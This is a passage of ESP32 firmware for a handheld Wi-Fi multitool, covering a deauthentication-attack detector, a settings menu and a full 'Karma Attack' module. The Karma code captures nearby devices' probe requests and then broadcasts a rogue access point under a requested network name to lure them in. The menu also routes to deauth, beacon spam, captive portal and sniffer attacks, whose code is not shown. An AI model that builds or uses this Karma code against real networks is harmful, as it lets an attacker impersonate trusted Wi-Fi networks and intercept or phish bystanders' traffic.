  for (int row = 0; row < ddLogCount && row < 7; row++) {
    int y = 22 + row * 14;
    char mac[24]; macToString(ddLog[row].attacker, mac);
    text(mac, 3, y, COL_TEXT);
    const char* vendor = ouiVendor(ddLog[row].attacker);
    text(vendor, 88, y, COL_ACCENT);
  }
  centerText("BACK: return", 120, COL_DIM);
}

void drawDeauthDetectorScreen() {
  clearScreen(); header("Deauth Detector");
  bool attacking = (millis() - lastDDSeenTime < 2000);
  if (attacking) {
    if (ddAlarmFrames & 1) {
      tft.fillRect(0, 18, 160, 110, COL_WARN);
      centerText("ATTACK", 30, COL_TEXT, 3);
      centerText("DETECTED", 58, COL_TEXT, 3);
    } else {
      centerText("ATTACK", 30, COL_WARN, 3);
      centerText("DETECTED", 58, COL_WARN, 3);
    }
    char buf[32];
    snprintf(buf, sizeof(buf), "Packets: %lu", ddTotalPackets);
    text(buf, 6, 88, COL_TEXT);
    char mac[24]; macToString((const uint8_t*)deauthAttackerMAC, mac);
    text(mac, 6, 100, COL_TEXT);
    const char* vendor = ouiVendor((const uint8_t*)deauthAttackerMAC);
    text(vendor, 6, 112, COL_TEXT);
  } else {
    centerText("MONITORING", 30, COL_ACCENT, 2);
    char buf[32];
    snprintf(buf, sizeof(buf), "Packets: %lu", ddTotalPackets);
    text(buf, 6, 60, COL_TEXT);
    snprintf(buf, sizeof(buf), "Attacks: %d", ddLogCount);
    text(buf, 6, 74, COL_ACCENT);
    text("Channel: ", 6, 90, COL_ACCENT2);
    char chbuf[8]; snprintf(chbuf, sizeof(chbuf), "%d", deauthLastChannel ? deauthLastChannel : 1);
    text(chbuf, 74, 90, COL_TEXT);
    centerText("All quiet", 108, COL_ACCENT2);
  }
  centerText("NEXT: log  BACK: exit", 122, COL_DIM);
}

void tickDeauthDetector(bool entered) {
  static unsigned long lastDraw = 0, lastHop = 0;
  static int chIdx = 0;
  static bool showLog = false;
  static const uint8_t channels[] = {1, 6, 11};

  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    ddTotalPackets = 0; deauthAttackPackets = 0;
    deauthLastSeen = 0; lastDDSeenTime = 0;
    ddLogCount = 0; ddAlarmFrames = 0; showLog = false;
    esp_wifi_set_promiscuous_rx_cb(deauthDetectorCallback);
    esp_wifi_set_promiscuous(true);
    clearScreen(); header("Deauth Detector");
    centerText("Starting...", 55, COL_ACCENT, 2);
    delay(300);
    lastDraw = 0; lastHop = millis(); chIdx = 1;
    drawDeauthDetectorScreen();
  }

  if (millis() - lastHop > 4000) {
    lastHop = millis();
    chIdx = (chIdx + 1) % 3;
    esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
  }

  if (deauthLastSeen != 0) {
    uint8_t macCopy[6];
    int8_t rssiCopy;
    noInterrupts();
    memcpy(macCopy, (const void*)deauthAttackerMAC, 6);
    rssiCopy = deauthAttackerRSSI;
    deauthLastSeen = 0;
    interrupts();
    addDDLog(macCopy, rssiCopy);
  }

  if (backPressed()) {
    if (showLog) { showLog = false; lastDraw = 0; }
    else {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_promiscuous_rx_cb(nullptr);
      screen = WIFI_MENU; return;
    }
  }

  if (nextPressed()) { showLog = !showLog; lastDraw = 0; }

  bool attacking = (millis() - lastDDSeenTime < 2000);
  unsigned long interval = attacking ? 200 : 400;

  if (attacking && millis() - lastBeepAttack > 800) {
    lastBeepAttack = millis();
    beepTone(3000, 80);
  }

  if (millis() - lastDraw > interval) {
    lastDraw = millis();
    ddAlarmFrames++;
    if (showLog) drawDDLogScreen();
    else drawDeauthDetectorScreen();
  }
}

// ================= KARMA ATTACK =================
struct KarmaTarget { char ssid[32]; uint8_t channel; unsigned long lastSeen; bool seen; };
const int KARMA_MAX = 8;
KarmaTarget karmaList[KARMA_MAX];
int karmaCount = 0;
volatile unsigned long karmaProbes = 0;
volatile char karmaLastSSID[32] = "";
volatile uint8_t karmaLastMAC[6] = {0};
bool karmaRunning = false;
char karmaActiveSSID[32] = "";

void IRAM_ATTR karmaCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;
  if ((p[0] & 0xF0) != 0x40) return;

  karmaProbes++;
  memcpy((void*)karmaLastMAC, p + 10, 6);

  char tmp[32] = "";
  for (int i = 24; i < len - 2; ) {
    uint8_t tagId = p[i], tagLen = p[i + 1];
    if (i + 2 + tagLen > len) break;
    if (tagId == 0x00) {
      int l = tagLen > 31 ? 31 : tagLen;
      memcpy(tmp, p + i + 2, l);
      tmp[l] = '\0';
      break;
    }
    i += 2 + tagLen;
  }
  if (tmp[0] == '\0') return;
  strncpy((char*)karmaLastSSID, tmp, 31);
  karmaLastSSID[31] = '\0';
}

void addKarmaTarget(const char* ssid, uint8_t ch) {
  for (int i = 0; i < karmaCount; i++) {
    if (strcmp(karmaList[i].ssid, ssid) == 0) { karmaList[i].lastSeen = millis(); return; }
  }
  if (karmaCount < KARMA_MAX) {
    strncpy(karmaList[karmaCount].ssid, ssid, 31);
    karmaList[karmaCount].ssid[31] = '\0';
    karmaList[karmaCount].channel = ch;
    karmaList[karmaCount].lastSeen = millis();
    karmaList[karmaCount].seen = true;
    karmaCount++;
    beepTone(2600, 30);
  } else {
    for (int i = 0; i < KARMA_MAX - 1; i++) karmaList[i] = karmaList[i + 1];
    strncpy(karmaList[KARMA_MAX - 1].ssid, ssid, 31);
    karmaList[KARMA_MAX - 1].channel = ch;
    karmaList[KARMA_MAX - 1].lastSeen = millis();
    karmaList[KARMA_MAX - 1].seen = true;
  }
}

void drawKarmaScreen() {
  clearScreen(); header("Karma Attack");
  if (karmaRunning) {
    centerText("KARMA ON", 20, COL_WARN, 2);
    char buf[40];
    char shortSsid[24]; truncateTo(karmaActiveSSID, shortSsid, 22);
    snprintf(buf, sizeof(buf), "SSID: %s", shortSsid);
    text(buf, 4, 44, COL_TEXT);
    snprintf(buf, sizeof(buf), "Probes: %lu", karmaProbes);
    text(buf, 4, 58, COL_ACCENT);
    snprintf(buf, sizeof(buf), "Targets: %d", karmaCount);
    text(buf, 4, 72, COL_ACCENT2);
    centerText("SELECT: stop", 100, COL_DIM);
    centerText("BACK: exit", 114, COL_DIM);
  } else {
    centerText("KARMA OFF", 20, COL_ACCENT, 2);
    char buf[32];
    snprintf(buf, sizeof(buf), "Probes: %lu", karmaProbes);
    text(buf, 4, 44, COL_TEXT);
    snprintf(buf, sizeof(buf), "Targets: %d", karmaCount);
    text(buf, 4, 58, COL_ACCENT);
    int show = min(karmaCount, 4);
    for (int i = 0; i < show; i++) {
      int y = 76 + i * 11;
      char shortSsid[22]; truncateTo(karmaList[i].ssid, shortSsid, 20);
      text(shortSsid, 4, y, COL_ACCENT2);
      char ch[8]; snprintf(ch, sizeof(ch), "ch%d", karmaList[i].channel);
      text(ch, 132, y, COL_DIM);
    }
    centerText("SELECT: start", 122, COL_DIM);
  }
}

void tickKarma(bool entered) {
  static unsigned long lastDraw = 0, lastTargetUpdate = 0;
  static int chIdx = 0;
  static const uint8_t channels[] = {1, 6, 11};

  if (entered) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); delay(200);
    WiFi.mode(WIFI_STA); delay(300);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    karmaCount = 0; karmaProbes = 0; karmaLastSSID[0] = '\0';
    karmaRunning = false; karmaActiveSSID[0] = '\0';
    esp_wifi_set_promiscuous_rx_cb(karmaCallback);
    esp_wifi_set_promiscuous(true);
    clearScreen(); header("Karma Attack");
    centerText("Starting...", 55, COL_ACCENT, 2);
    delay(300);
    lastDraw = 0; chIdx = 0;
    drawKarmaScreen();
  }

  if (millis() - lastTargetUpdate > 1500) {
    lastTargetUpdate = millis();
    chIdx = (chIdx + 1) % 3;
    esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
  }

  if (karmaLastSSID[0] != '\0') {
    char ssidCopy[32];
    noInterrupts();
    strncpy(ssidCopy, (const char*)karmaLastSSID, 31);
    ssidCopy[31] = '\0';
    karmaLastSSID[0] = '\0';
    interrupts();
    addKarmaTarget(ssidCopy, channels[chIdx]);
  }

  if (backPressed()) {
    if (karmaRunning) {
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_STA);
      karmaRunning = false;
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    screen = WIFI_MENU; return;
  }

  if (selectPressed()) {
    if (!karmaRunning) {
      if (karmaCount == 0) { beepError(); drawKarmaScreen(); }
      else {
        strncpy(karmaActiveSSID, karmaList[karmaCount - 1].ssid, 31);
        karmaActiveSSID[31] = '\0';
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP(karmaActiveSSID);
        delay(300);
        karmaRunning = true;
        beepSuccess();
        drawKarmaScreen();
      }
    } else {
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_STA);
      delay(200);
      esp_wifi_set_promiscuous_rx_cb(karmaCallback);
      esp_wifi_set_promiscuous(true);
      karmaRunning = false;
      beepBack();
      drawKarmaScreen();
    }
  }

  if (millis() - lastDraw > 300) { lastDraw = millis(); drawKarmaScreen(); }
}

// ================= SETTINGS =================
const int SETTINGS_ITEMS = 3;

void drawSettingsScreen() {
  clearScreen(); header("Settings");
  char brBuf[32];
  snprintf(brBuf, sizeof(brBuf), "Brightness: %d/%d", brightnessLevel + 1, BRIGHTNESS_LEVELS);
  menuItem(28, brBuf, settingsItem == 0);
  char bzBuf[24];
  snprintf(bzBuf, sizeof(bzBuf), "Buzzer: %s", buzzerEnabled ? "ON" : "OFF");
  menuItem(50, bzBuf, settingsItem == 1);
  menuItem(72, "Back", settingsItem == 2);
  centerText("NEXT: nav  SELECT: change", 118, COL_DIM);
}

void tickSettings(bool entered) {
  if (entered) drawSettingsScreen();
  if (backPressed()) { screen = MAIN; return; }
  if (nextPressed()) { settingsItem = (settingsItem + 1) % SETTINGS_ITEMS; drawSettingsScreen(); }
  if (selectPressed()) {
    if (settingsItem == 0) {
      brightnessLevel = (brightnessLevel + 1) % BRIGHTNESS_LEVELS;
      applyBrightness();
      drawSettingsScreen();
    } else if (settingsItem == 1) {
      buzzerEnabled = !buzzerEnabled;
      if (buzzerEnabled) beepSelect();
      drawSettingsScreen();
    } else { screen = MAIN; }
  }
}

// ================= TICK-ФУНКЦИИ =================
void tickWifiMenu(bool entered) {
  if (entered) drawWiFiMenu();
  if (backPressed()) { screen = MAIN; return; }
  if (nextPressed()) { wifiItem = (wifiItem + 1) % WIFI_ITEMS; drawWiFiMenu(); }
  if (selectPressed()) {
    if (wifiItem == 0) { screen = scanNetworks() ? WIFI_SCAN : WIFI_MENU; if (screen == WIFI_MENU) drawWiFiMenu(); }
    else if (wifiItem == 1) screen = WIFI_STATUS;
    else if (wifiItem == 2) screen = WIFI_HOTSPOT;
    else if (wifiItem == 3) screen = BEACON_SPAM;
    else if (wifiItem == 4) screen = CAPTIVE_PORTAL;
    else if (wifiItem == 5) screen = SNIFFER;
    else if (wifiItem == 6) screen = DEAUTH;
    else if (wifiItem == 7) screen = RADAR;
    else if (wifiItem == 8) screen = DEAUTH_DETECTOR;
    else if (wifiItem == 9) screen = KARMA;
  }
}

void tickWifiScan(bool entered) {
  if (entered) drawNetworkList();
  if (backPressed()) { screen = WIFI_MENU; return; }
  if (nextPressed() && networkCount > 0) { networkItem = (networkItem + 1) % networkCount; drawNetworkList(); }
  if (selectPressed()) { screen = WIFI_INFO; }
}

void tickWifiInfo(bool entered) {
  if (entered) showNetworkInfo(networkItem);
  if (backPressed()) { screen = WIFI_SCAN; return; }
  if (selectPressed()) { connectOpenNetwork(networkItem); screen = WIFI_SCAN; }
}

void tickWifiStatus(bool entered) {
  if (entered) showWiFiStatus();
  if (backPressed()) { screen = WIFI_MENU; }
}

void tickDisplayTest(bool entered) {
  if (entered) displayTestScreen();
  if (backPressed()) { screen = MAIN; }
}

void tickWeather(bool entered) {
  if (entered) loadWeatherAndDraw();
  if (backPressed()) { screen = MAIN; return; }
  if (selectPressed()) loadWeatherAndDraw();
}

void tickInfo(bool entered) {
  if (entered) infoScreen();
  if (backPressed()) { screen = MAIN; }
}

void tryAutoConnect() {
  if (strcmp(WIFI_SSID, "YOUR_WIFI") == 0) return;
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
  unsigned long start = millis();
  int frame = 0;
  while (WiFi.status() != WL_CONNECTED && millis() - start < 8000) {
    drawLoading("WiFi", frame++); delay(200);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_BACK, INPUT_PULLUP);
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(TFT_BL, OUTPUT);
  applyBrightness();
  tft.initR(INITR_BLACKTAB);
  tft.setRotation(3);
  tft.setTextWrap(false);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  randomSeed(micros());
  tryAutoConnect();
}

void loop() {
  bool entered = screenEntered;
  screenEntered = false;

  switch (screen) {
    case MAIN:              tickMain(entered);              break;
    case WIFI_MENU:         tickWifiMenu(entered);          break;
    case WIFI_SCAN:         tickWifiScan(entered);          break;
    case WIFI_INFO:         tickWifiInfo(entered);          break;
    case WIFI_STATUS:       tickWifiStatus(entered);        break;
    case WIFI_HOTSPOT:      tickHotspot(entered);           break;
    case BEACON_SPAM:       tickBeaconSpam(entered);        break;
    case CAPTIVE_PORTAL:    tickCaptivePortal(entered);     break;
    case SNIFFER:           tickSniffer(entered);           break;
    case DEAUTH:            tickDeauth(entered);            break;
    case RADAR:             tickRadar(entered);             break;
    case DEAUTH_DETECTOR:   tickDeauthDetector(entered);    break;
    case KARMA:             tickKarma(entered);             break;
    case NFC_MENU:          tickNfcMenu(entered);           break;
    case NFC_READ:          tickNfcRead(entered);           break;
    case NFC_HISTORY:       tickNfcHistory(entered);        break;
    case DISPLAY_TEST:      tickDisplayTest(entered);       break;
    case WEATHER:           tickWeather(entered);           break;
    case INFO:              tickInfo(entered);              break;
    case SETTINGS:          tickSettings(entered);          break;
    default:                screen = MAIN;                  break;
  }

  if (screen != prevScreen) {
    prevScreen = screen;
    screenEntered = true;
  }

  delay(2);
}
